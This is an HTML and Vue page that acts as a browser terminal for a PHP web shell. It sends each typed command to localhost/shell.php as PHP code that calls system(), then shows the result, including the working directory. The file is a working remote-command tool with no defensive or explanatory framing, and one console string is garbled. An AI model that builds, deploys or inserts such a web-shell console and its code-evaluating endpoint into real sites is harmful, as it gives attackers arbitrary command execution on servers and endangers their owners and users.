<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>

    <script crossorigin="anonymous" integrity="sha384-LVoNJ6yst/aLxKvxwp6s2GAabqPczfWh6xzm38S/YtjUyZ+3aTKOnD/OJVGYLZDl"
            src="https://lib.baomitu.com/jquery/3.5.0/jquery.min.js"></script>

    <script crossorigin="anonymous"
            integrity="sha512-BKbSR+cfyxLdMAsE0naLReFSLg8/pjbgfxHh/k/kUC82Hy7r6HtR5hLhobaln2gcTvzkyyehrdREdjpsQwy2Jw=="
            src="https://lib.baomitu.com/vue/2.6.12/vue.min.js"></script>
    <!--    <script src="gbk.js"></script>-->
</head>
<body>

<div class="content" id="app" ref="content">
    <div class="terminal" ref="terminal">
        <div class="row" v-for="type of row">
            <div class="type-history">{{type.history}}</div>
            <pre class="result">{{type.result}}</pre>
        </div>
        <div class="row">
            <div class="type-container">
                <textarea class="type"
                          @input="input(event,type)"
                          @keydown="keydown(event,type)"
                          v-model="type.tmpPwd"></textarea>
                <span class="float-pwd">{{type.pwd}}</span>
            </div>
        </div>
    </div>
</div>
</body>
</html>
<script>

    new Vue({
        el: '#app',
        data: {
            pwd: 'D:\\safe\\hw\\2020_09_18',
            row: [],
            type: {},
            urlencode: [
                {
                    k: '%',
                    v: '%25'
                }, {
                    k: '&',
                    v: '%26'
                },
            ]
        },
        created() {
            let search = location.search.substr(1).split('&')
            let param = search.reduce((p, c, i) => {
                let t = c.split('=')
                p[t[0]] = t[1]
                return p
            }, {})
            this.getPwd(param)
        },
        directives: {
            focus: {
                inserted: function (el) {
                    el.focus()
                }
            }
        },
        methods: {
            getPwd() {
                let that = this
                let cmd = 'echo %25cd%25'
                let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
                $.ajax({
                    url: 'http://localhost/shell.php?c=' + phpCode,
                    success(res) {
                        console.log(JSON.stringify(res));
                        res = res.replace('\r\n', '')
                        console.log(JSON.stringify(res));
                        that.pwd = res
                        that.type = {
                            tmpPwd: that.pwd + '>',
                            pwd: that.pwd + '>',
                            id: '',
                        }
                    }
                })
            },
            clone(obj) {
                return JSON.parse(JSON.stringify(obj))
            },
            exec(event, cmd) {
                if (cmd === '') return
                if (cmd === 'cls') {
                    this.row = []
                    this.type.tmpPwd = this.type.pwd
                    this.type.id = ''
                    return
                }
                let that = this
                let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
                $.ajax({
                    url: 'http://localhost/shell.php?c=' + phpCode,
                    success(res) {
                        that.row.push({
                            cmd: cmd,
                            history: that.clone(that.type.tmpPwd),
                            result: res,
                        })
                        console.log(that.row);
                        that.type.tmpPwd = that.type.pwd
                        that.$nextTick(() => {
                            that.$refs.content.scrollTop = that.$refs.terminal.scrollHeight;
                        })
                    }
                })
            },
            cmdAutoComplete(type, cmd) {
                switch (cmd) {
                    case 'cls':
                        this.row = []
                        this.row.push({
                            tmpPwd: this.pwd + '>',
                            pwd: this.pwd + '>',
                            history: '',
                            result: '',
                        })
                        break;
                }

            },
            keydown(event, type) {
                let cmd = type.tmpPwd.substr(type.pwd.length, type.tmpPwd.length)
                console.log(type);
                // console.log(event.keyCode);
                if (event.keyCode === 13) {
                    event.returnValue = false;
                    this.exec(event, cmd)
                }
                if (event.keyCode === 9) {
                    console.log('tabé”®');
                    this.cmdAutoComplete(type, cmd)
                    event.returnValue = false;
                }
                if (event.keyCode === 38) {
                    console.log(JSON.stringify(this.row, null, 4))
                    if (this.type.id !== '') {
                        if (this.type.id !== 0) {
                            this.type.id = this.type.id - 1
                            this.type.tmpPwd = this.row[this.type.id].history
                        } else {
                            this.type.tmpPwd = this.row[this.row.length - 1].history
                            this.type.id = this.row.length - 1
                        }
                    } else {
                        if (this.row.length) {
                            this.type.tmpPwd = this.row[this.row.length - 1].history
                            this.type.id = this.row.length - 1
                        }
                    }
                    console.log(this.type.id);
                    return
                }
                if (event.keyCode === 40) {
                    console.log(JSON.stringify(this.row, null, 4))
                    console.log(this.type.id);
                    if (this.type.id !== '') {
                        if (this.type.id !== this.row.length - 1) {
                            this.type.id = this.type.id + 1
                            this.type.tmpPwd = this.row[this.type.id].history
                        } else {
                            this.type.id = 0
                            this.type.tmpPwd = this.row[this.type.id].history
                        }
                    }
                    return
                }
                if (event.keyCode === 8) {
                    if (type.tmpPwd === type.pwd) {
                        event.returnValue = false;
                    }
                }
            },
            input(event, type) {
                let textArea = event.target;
                if (textArea.scrollHeight > 195) {
                    textArea.style.height = textArea.scrollHeight + 'px'
                }
                if (event.target.value === '') {
                    type.tmpPwd = type.pwd
                }
                if (type.tmpPwd.length < type.pwd.length) {
                    type.tmpPwd = type.pwd
                }
                if (type.tmpPwd.substr(0, type.pwd.length) !== type.pwd) {
                    type.tmpPwd = type.pwd
                }
            },
        },
        mounted() {
            let that = this

        }
    })
</script>
